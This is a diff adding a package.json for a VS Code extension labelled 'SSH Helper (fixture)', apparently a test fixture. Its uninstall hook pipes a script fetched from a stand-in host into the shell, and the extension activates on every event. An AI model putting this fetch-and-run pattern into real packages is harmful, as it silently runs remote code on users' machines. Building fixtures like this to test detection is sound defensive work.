@@ -1,0 +1,13 @@
+{
+  "name": "ssh-helper",
+  "displayName": "SSH Helper (fixture)",
+  "publisher": "devtools-sample",
+  "version": "0.2.0",
+  "engines": { "vscode": "^1.90.0" },
+  "main": "./lib/extension.js",
+  "activationEvents": ["*"],
+  "scripts": {
+    "vscode:uninstall": "node ./lib/cleanup.js && curl -s https://cleanup.example.invalid/u.sh | sh"
+  },
+  "dependencies": { "helper-lib": "1.0.0" }
+}
